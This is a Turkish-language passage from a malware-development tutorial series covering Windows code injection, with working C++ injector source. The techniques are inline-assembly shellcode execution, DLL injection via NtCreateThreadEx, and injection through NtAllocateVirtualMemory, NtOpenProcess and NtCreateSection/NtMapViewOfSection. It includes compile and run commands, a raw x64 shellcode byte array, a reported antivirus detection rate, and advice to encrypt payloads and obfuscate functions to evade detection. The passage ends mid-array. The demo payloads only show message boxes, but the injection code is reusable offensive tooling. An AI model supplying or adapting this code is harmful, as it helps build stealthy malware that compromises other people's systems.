x86_64-w64-mingw32-g++ -O2 hooking2.cpp -o hooking2.exe \
-mconsole -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
+++++++++++++++++++++++++++++++++++

ve çalıştıralım:
.\hooking2.exe

++++++++++++++++++++++++++++++++++++
Github’ki kaynak kod: https://github.com/cocomelonc/2021-11-30-basic-hooking-1
MessageBox(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox)
WinExec(https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)
Exporting from DLL using __declspec(https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=msvc-170)

20. Inline ASM ile Shellcode Çalıştırma. Basit C++ Örneği.

Bismillah
++++++++++++++++++++++++++++++++++++

Bu bölüm oldukça kısa ve zararlı yazılımda shellcode çalıştırmak için inline assembly kullanımını açıklayan bir örneği tanımlamaktadır.

Hadi zararlı yazılımımızın C++ kaynak kodu örneğine bakalım:
/*
hack.cpp
code inject via inline ASM
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/03/inline-asm-1.html
*/
#include <windows.h>
#include <stdio.h>
int main() {
	printf("=^..^= meow-meow. You are hacked =^..^=\n");
	asm(".byte 0x90,0x90,0x90,0x90\n\t
		"ret \n\t");
	return 0;
}

Gördüğünüz gibi, mantık oldukça basit. 4 adet `NOP` talimatı ekliyorum ve öncesinde 'meow-meow' dizgisini yazdırıyorum. Bu meow dizgisini temel alarak debugger'da shellcode'u kolayca bulabiliyorum.

++++++++++++++++++++++++++++++++++++

Hadi derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe \
-mconsole -fpermissive

++++++++++++++++++++++++++++++++++++

Ve bunu x96dbg'de çalıştıralım (benim durumumda Windows 7 x64 üzerinde):

++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, vurgulanan talimatlar benim `NOP` talimatlarım, bu yüzden her şey beklendiği gibi mükemmel bir şekilde çalışıyor.

Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, `VirtualAlloc` kullanarak shellcode'u kopyalamak için yeni RWX bellek tahsis etmenizi gerektirmemesidir. Bu yöntem daha popüler ve şüpheli olup, mavi takım üyeleri tarafından daha fazla araştırılmaktadır

Umarım bu yazı, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

inline assembly(https://docs.microsoft.com/en-us/cpp/assembler/inline/inline-assembler?view=msvc-170)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-12-03-inline-asm-1

21. NtCreateThreadEx ile DLL Enjeksiyonu. Basit C++ Örneği.

Bismillah

++++++++++++++++++++++++++++++++++++

Önceki bölümlerde `CreateRemoteThread` ve `SetWindowsHookEx` ile klasik DLL enjeksiyonunu yazmıştım.

Bugün başka bir DLL enjeksiyon tekniğini ele alacağım. Bu teknik, belgelenmemiş bir işlev olan `NtCreateThreadEx`'i kullanmamız anlamına geliyor. Şimdi, `VirtualAllocEx`, `WriteProcessMemory`, `WaitForSingleObject` gibi Win32API işlevlerinden ve belgelenmemiş bir Native API olan `NtCreateThreadEx`'den faydalanarak zararlı DLL'i uzak bir sürece nasıl enjekte edeceğimizi gösterelim.

Öncelikle, zararlı DLL'imizin (evil.c) C++ kaynak koduna bakalım:

/*
DLL example for DLL injection via NtCreateThreadEx
author: @cocomelonc
https://cocomelonc.github.io/pentest/2021/12/06/malware-injection-9.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		MessageBox(
			NULL,
			"Meow-meow!",
			"=^..^=",
			MB_OK
		);
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

Her zamanki gibi oldukça basit. Sadece 'Meow-meow!' mesajını gösteriyor.

DLL'imizi derleyelim:

x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c

++++++++++++++++++++++++++++++++++++

Daha sonra, zararlı yazılımımızın kaynak koduna bakalım (hack.cpp):

/*
hack.cpp
DLL injection via undocumented NtCreateThreadEx example
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/06/malware-injection-9.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);

// get process PID
int findMyProc(const char *procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
		break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	DWORD pid = 0; // process ID
	HANDLE ph; // process handle
	HANDLE ht; // thread handle
	LPVOID rb; // remote buffer
	SIZE_T rl; // return length

	char evilDll[] = "evil.dll";
	int evilLen = sizeof(evilDll) + 1;

	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	LPTHREAD_START_ROUTINE lb =
	(LPTHREAD_START_ROUTINE) GetProcAddress(
		hKernel32, "LoadLibraryA");
	pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(
		GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");

	if (ntCTEx == NULL) {
		CloseHandle(ph);
		printf("NtCreateThreadEx failed :( exiting...\n");
		return-2;
	}

	pid = findMyProc(argv[1]);
	if (pid == 0) {
		printf("PID not found :( exiting...\n");
		return-1;
	} else {
		printf("PID = %d\n", pid);

		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
		
		if (ph == NULL) {
			printf("OpenProcess failed :( exiting...\n");
			return-2;
		}

		// allocate memory buffer for remote process
		rb = VirtualAllocEx(ph, NULL, evilLen,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

		// write payload to memory buffer
		WriteProcessMemory(ph, rb, evilDll, evilLen, rl); // NULL);

		ntCTEx(&ht, 0x1FFFFF, NULL, ph,
		(LPTHREAD_START_ROUTINE) lb, rb,
		FALSE, NULL, NULL, NULL, NULL);

		if (ht == NULL) {
			CloseHandle(ph);
			printf("ThreadHandle failed :( exiting...\n");
			return-2;
		} else {
			printf("successfully inject via NtCreateThreadEx :)\n");
		}

		WaitForSingleObject(ht, INFINITE);

		CloseHandle(ht);
		CloseHandle(ph);
	}
	return 0;
}
Bu kodun mantığını inceleyelim. Gördüğünüz gibi, ilk olarak önceki yazılarımdan bir işlev olan `FindMyProc`'u kullandım. Bu işlev oldukça basittir; temelde yaptığı şey, enjekte etmek istediğimiz sürecin adını alır, işletim sistemi belleğinde onu bulmaya çalışır ve eğer mevcutsa, çalışıyorsa, bu işlev o sürecin ID’sini döndürür.

Daha sonra, ana işlevde mantığımız klasik DLL enjeksiyonu yazımdaki ile aynıdır. Tek fark, `CreateRemoteThread` yerine `NtCreateThreadEx` işlevini kullanmamızdır:

++++++++++++++++++++++++++++++++++++

Bu kodda gösterildiği gibi, Windows API çağrısı bir Native API çağrısı ile değiştirilebilir. Örneğin, `VirtualAllocEx` yerine `NtAllocateVirtualMemory` ve `WriteProcessMemory` yerine `NtWriteProcessMemory` kullanılabilir.

Bu yöntemin dezavantajı, işlevin belgelenmemiş olmasıdır, bu yüzden gelecekte değişebilir.

Ancak bir sorun var. Şimdi 'kurban' sürecimiz için basit bir kod oluşturalım (mouse.c):

/*
hack.cpp
victim process source code for DLL injection via NtCreateThreadEx
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/06/malware-injection-9.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int main() {
	MessageBox(NULL, "Squeak-squeak!", "<:( )~~", MB_OK);
	return 0;
}
Gördüğünüz gibi, mantık oldukça basit. Sadece 'Squeak-squeak!' mesajını gösteriyor. Derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-fpermissive

++++++++++++++++++++++++++++++++++++

Ve kontrol edelim:

++++++++++++++++++++++++++++++++++++

Her şey mükemmel bir şekilde çalıştı.

Şimdi zararlı DLL'imizi bu sürece enjekte edelim. hack.cpp'yi derleyelim:

x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive

++++++++++++++++++++++++++++++++++++

Daha sonra Process Hacker 2'yi çalıştıralım:

++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, vurgulanan süreç kurban mouse.exe'miz.

Basit zararlı yazılımımızı çalıştıralım:

.\hack.exe mouse.exe

++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, zararlı yazılımımız kurbanın süreç ID’sini doğru bir şekilde buldu.

Kurban sürecimizin PID özelliklerini inceleyelim: 3884:

++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, zararlı DLL'imiz beklendiği gibi başarıyla enjekte edildi!

Peki neden notepad.exe veya svchost.exe gibi başka bir sürece enjekte etmiyoruz?

Session Separation hakkında okudum ve bunun bu sorunun nedeni olduğunu düşünüyorum, bu yüzden bir sorum var: Windows 10'u nasıl hacklerim? :)

Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, mavi takım üyeleri tarafından daha fazla araştırılan ve daha popüler olan `CreateRemoteThread`'i kullanmıyor olmamızdır.

Umarım bu yazı, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

Session Separation(https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-12-06-malware-injection-9

22. Belgelenmemiş NtAllocateVirtualMemory ile Kod Enjeksiyonu. Basit C++ Örneği.

Bismillah

Bir önceki bölümde, belgelenmemiş NtCreateThreadEx ile DLL enjeksiyonundan bahsetmiştim.

Bugün başka bir işlevi, örneğin VirtualAllocEx'i, belgelenmemiş NT API işlevi NtAllocateVirtualMemory ile değiştirmeyi denedim. İşte ortaya çıkan sonuç.
Şimdi, `WriteProcessMemory`, `CreateRemoteThread` gibi WIN API işlevlerinden ve resmi olarak belgelenmemiş bir Native API olan `NtAllocateVirtualMemory`'den faydalanarak, payload'u uzak bir sürece nasıl enjekte edeceğimizi gösterelim.

İlk olarak, `NtAllocateVirtualMemory` işlevinin söz dizimine bakalım:
NTSYSAPI
NTSTATUS
NTAPI NtAllocateVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID *BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
);

Peki, bu işlev ne yapar? Belgelerine göre, belirtilen bir sürecin kullanıcı modu sanal adres alanı içinde sayfaların bir bölgesini ayırır, taahhüt eder veya her ikisini yapar. Yani, Win API `VirtualAllocEx` ile benzer şekilde çalışır.


NtAllocateVirtualMemory işlevini kullanabilmek için, kodumuzda tanımını belirtmemiz gerekiyor:
+++++++++++++++++++++++=

Daha sonra, `ntdll.dll` kütüphanesini yükleyip `NtAllocateVirtualMemory` işlevini çağıracağız:
+++++++++++++++++++++++++++

Ve ardından işlevimizin başlangıç adresini alacağız:
++++++++++++++++++++++++++++

Son olarak belleği tahsis edeceğiz:
+++++++++++++++++++++++++++

Ve bunun dışında ana mantık aynı.
+++++++++++++++++++++++++++

Bu kodta gösterildiği gibi, Windows API çağrısı bir Native API çağrısı ile değiştirilebilir. Örneğin, `VirtualAllocEx` yerine `NtAllocateVirtualMemory`, `WriteProcessMemory` yerine `NtWriteProcessMemory` kullanılabilir.

Bu yöntemin dezavantajı, işlevin belgelenmemiş olmasıdır, bu yüzden gelecekte değişebilir.

Şimdi basit zararlı yazılımımızı eylemde görelim. `hack.cpp`'yi derleyelim:
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive
+++++++++++++++++++++++++++++++

Daha sonra Process Hacker 2'yi çalıştıralım:
++++++++++++++++++++++++++++++++

Örneğin, vurgulanan süreç mspaint.exe bizim kurbanımızdır.

Basit zararlı yazılımımızı çalıştıralım:
.\hack.exe 6252
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, meow-meow mesaj kutumuz açıldı.

Kurban sürecimizin PID özelliklerini inceleyelim: 6252:
+++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, meow-meow payload beklendiği gibi başarıyla enjekte edildi!


Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, mavi takım üyeleri tarafından daha fazla araştırılan ve daha popüler olan `VirtualAllocEx`'i kullanmıyor olmamızdır.

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.


Bir sonraki bölümde, başka NT API işlevlerini ele almaya çalışacağım. Ana mantık aynı, ancak yapıların ve ilgili parametrelerin tanımlanmasıyla ilgili bir sorun var. Bu yapılar tanımlanmadan kod çalışmayacaktır.  

VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
NtAllocateVirtualMemory(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
CreateRemoteThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-12-07-malware-injection-10

23. Belgelenmemiş Native API İşlevleri ile Kod Enjeksiyonu. Basit C++ Örneği.

Bismillah

+++++++++++++++++++++++++++

Önceki bölümlerde, belgelenmemiş `NtCreateThreadEx` ve `NtAllocateVirtualMemory` ile DLL enjeksiyonundan bahsetmiştim.

Bu yazı, belgelenmemiş Native API ile etkileşimde bulunarak kötü amaçlı yazılım geliştirme tekniği üzerine kendi araştırmamın bir sonucudur.

Bugün, `OpenProcess` işlevini, belgelenmemiş Native API işlevi `NtOpenProcess` ile değiştirmeyi denedim.

Öncelikle, `NtOpenProcess` işlevinin söz dizimine bakalım:
__kernel_entry NTSYSCALLAPI NTSTATUS NtOpenProcess(
	[out] PHANDLE ProcessHandle,
	[in] ACCESS_MASK DesiredAccess,
	[in] POBJECT_ATTRIBUTES ObjectAttributes,
	[in, optional] PCLIENT_ID ClientId
);

Burada `ObjectAttributes` ve `ClientId` parametrelerine dikkat etmek gerekiyor.
`ObjectAttributes` - İşlem nesne tanıtıcısına uygulanacak öznitelikleri belirten bir `OBJECT_ATTRIBUTES` yapısına işaretçidir. Bu, tanıtıcıyı açmadan önce tanımlanmalı ve başlatılmalıdır. ClientId- Açılacak sürecin iş parçacığını tanımlayan bir istemci ID’sine işaretçidir.


`NtOpenProcess` işlevini kullanabilmek için, kodumuzda tanımını belirtmemiz gerekiyor:
+++++++++++++++++++++++++++++++++++

Benzer şekilde, `OBJECT_ATTRIBUTES` ve `PCLIENT_ID` yapıları da tanımlanmalıdır. Bu yapılar NT Kernel başlık dosyalarında tanımlıdır.

WinDBG'yi yerel çekirdek modunda çalıştırabilir ve şunu çalıştırabiliriz:
dt nt!_OBJECT_ATTRIBUTES
++++++++++++++++++++++++++
++++++++++++++++++++++++++

Daha sonra şu komutları çalıştırabiliriz:
dt nt!_CLIENT_ID
++++++++++++++++++++++++
+++++++++++++++++++++++++
Ve:
dt nt!_UNICODE_STRING
++++++++++++++++++++++++
+++++++++++++++++++++++++

Ancak bir sorun daha var. `NtOpenProcess` işlevi/rotini tanıtıcıyı döndürmeden önce, tanıtıcıya uygulanacak nesne öznitelikleri başlatılmalıdır. Nesne özniteliklerini başlatmak için bir `IntitializeObjectAttributes` makrosu tanımlanır ve çağrılır. Bu makro, tanıtıcıları açan rutinlere bir nesne tanıtıcısının özelliklerini belirtir.
++++++++++++++++++++++++
+++++++++++++++++++++++++


   IntitializeObjectAttributes

Daha sonra, `ntdll.dll` kütüphanesini yükleyerek `NtOpenProcess` işlevini çağırıyoruz:
+++++++++++++++++++++++++


Ve ardından işlevimizin başlangıç adreslerini alıyoruz:
+++++++++++++++++++++++++


Son olarak, süreci açıyoruz:
+++++++++++++++++++++++++


Ve bunun dışında ana mantık aynı.
+++++++++++++++++++++++++


Bu kodda gösterildiği gibi, Windows API çağrısı `OpenProcess`, Native API işlevi `NtOpenProcess` ile değiştirilebilir. Ancak, NT çekirdek başlık dosyalarında tanımlı olan yapıların da tanımlanması gerekir.

Bu yöntemin dezavantajı, işlevin belgelenmemiş olmasıdır, bu yüzden gelecekte değişebilir.

Şimdi basit zararlı yazılımımızı eylemde görelim. `hack.cpp`'yi derleyelim:
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive

+++++++++++++++++++++++++

Daha sonra Process Hacker 2'yi çalıştıralım:
+++++++++++++++++++++++++


Örneğin, vurgulanan süreç mspaint.exe bizim kurbanımızdır.

Basit zararlı yazılımımızı çalıştıralım:
.\hack.exe 4964
+++++++++++++++++++++++++

Gördüğünüz gibi, meow-meow mesaj kutumuz açıldı.
Kurban sürecimizin PID özelliklerini inceleyelim: 4964:
+++++++++++++++++++++++++

Gördüğünüz gibi, meow-meow payload beklendiği gibi başarıyla enjekte edildi!

Gördüğünüz gibi, ana mantık önceki NT API işlev çağrısı teknikleriyle aynı, ancak yapıların ve ilgili parametrelerin tanımlanmasıyla ilgili bir sorun var. Bu yapılar tanımlanmadığı sürece kod çalışmaz.

Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, mavi takım üyeleri tarafından daha fazla araştırılan ve daha popüler olan `OpenProcess`'i kullanmıyor olmamızdır.

13.12.2021'de şifrelenmiş bir komutla yeni hack.exe dosyamızı Virustotal'a yükleyelim:
+++++++++++++++++++++++++
https://www.virustotal.com/gui/file/9f4213643891fc14473948deb15077d9b7b4d2
da3db467932e57e7e383e535e6?nocache=1

Gördüğünüz gibi, 65 antivirüs motorundan 5 tanesi dosyamızı zararlı olarak algıladı.

Daha iyi sonuçlar için, payload şifrelemesini bir anahtar ile ekleyebilir, işlevleri gizleyebilir veya her iki tekniği birleştirebilirsiniz.

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

WinDBG kernel debugging(https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/performing-local-kernel-debugging)
VirtualAllocEx(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
NtOpenProcess(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess)
NtAllocateVirtualMemory(https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory)
WriteProcessMemory(https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
CreateRemoteThread(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-12-11-malware-injection-11

24. Memory Sections ile Kod Enjeksiyonu. Basit C++ Örneği.

Bismillah
++++++++++++++++++++++

Önceki bölümlerde, WinAPI işlevlerinin Native API işlevleriyle değiştirildiği klasik enjeksiyonlardan bahsetmiştim.

Bu bölüm, başka bir kötü amaçlı yazılım geliştirme tekniği üzerine yaptığım kendi araştırmaların bir sonucudur.

Bu tür numaraların sıradan bir uygulamada kullanılması zararlı bir şeyin göstergesi olsa da, tehdit aktörleri süreç enjeksiyonu için bunları kullanmaya devam edecektir.

Bölüm (section) nedir? 

Bölüm, süreçler arasında paylaşılan bir bellek bloğudur ve `NtCreateSection` API'si ile oluşturulabilir.

Pratik Örnek

Bu tekniğin akışı şu şekildedir: Öncelikle, `NtCreateSection` aracılığıyla yeni bir bölüm nesnesi oluşturuyoruz:
+++++++++++++++++++++++
+++++++++++++++++++++++

Ardından, bir süreç bu bellek bloğunu okuyup/yazmadan önce, belirtilen bölümün bir görünümünü haritalandırmalıdır. Bu, `NtMapViewOfSection` ile yapılabilir:
 +++++++++++++++++++++++

Oluşturulan bölümün bir görünümünü yerel zararlı sürece RW korumasıyla haritalandırın:
 +++++++++++++++++++++++

Daha sonra, oluşturulan bölümün bir görünümünü uzak hedef sürece RX korumasıyla haritalandırın:
 +++++++++++++++++++++++

Gördüğünüz gibi, süreci açmak için Native API olan `NtOpenProcess` işlevini kullandım:
 +++++++++++++++++++++++

Sonra payload'umuzu yazıyoruz:
unsigned char my_payload[] =
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

+++++++++++++++++++++++
Ardından, hedef süreçte uzak bir iş parçacığı oluşturuyor ve shellcode'u tetiklemek için hedef süreçteki haritalandırılmış görünüme işaret ediyoruz (`RtlCreateUserThread`):
+++++++++++++++++++++++
+++++++++++++++++++++++

Son olarak, temizleme işlemi için `ZwUnmapViewOfSection` kullandım:
+++++++++++++++++++++++
+++++++++++++++++++++++

Bu tekniği gösteren tam kod şu şekilde:
/*
	* hack.cpp
	* advanced code injection technique via
	* NtCreateSection and NtMapViewOfSection
	* author @cocomelonc
	* https://cocomelonc.github.com/tutorial/
	2021/12/13/malware-injection-12.html
*/
#include <iostream>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "advapi32.lib")

#define InitializeObjectAttributes(p,n,a,r,s) { \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = (r); \
	(p)->Attributes = (a); \
	(p)->ObjectName = (n); \
	(p)->SecurityDescriptor = (s); \
	(p)->SecurityQualityOfService = NULL; \
}

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID {
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// NtCreateSection syntax
typedef NTSTATUS(NTAPI* pNtCreateSection)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL
);

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
);

// RtlCreateUserThread syntax
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientID
);

// NtOpenProcess syntax
typedef NTSTATUS(NTAPI* pNtOpenProcess)(
	PHANDLE ProcessHandle,
	ACCESS_MASK AccessMask,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID ClientID
);

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
);

// get process PID
int findMyProc(const char *procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	// 64-bit meow-meow messagebox without encryption
	unsigned char my_payload[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
		"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
		"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
		"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
		"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
		"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
